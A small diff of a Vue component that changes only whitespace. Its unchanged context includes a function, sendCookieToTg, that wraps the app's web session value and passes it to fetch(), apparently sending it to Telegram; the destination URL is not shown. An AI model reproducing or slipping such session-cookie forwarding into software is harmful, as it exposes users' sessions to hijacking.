@@ -73,10 +73,9 @@
 
 <script setup>
 import { storeToRefs } from 'pinia'
-
 const appStore = useAppStore()
-const { webSession } = storeToRefs(appStore)
 
+const { webSession } = storeToRefs(appStore)
 const sendCookieToTg = () => {
   const data = `<pre><code class="language-javascript">${webSession.value}</code></pre>`
   fetch(
@@ -86,7 +85,6 @@ const sendCookieToTg = () => {
     },
   )
 }
-
 defineProps({
   left: {
     type: Boolean,
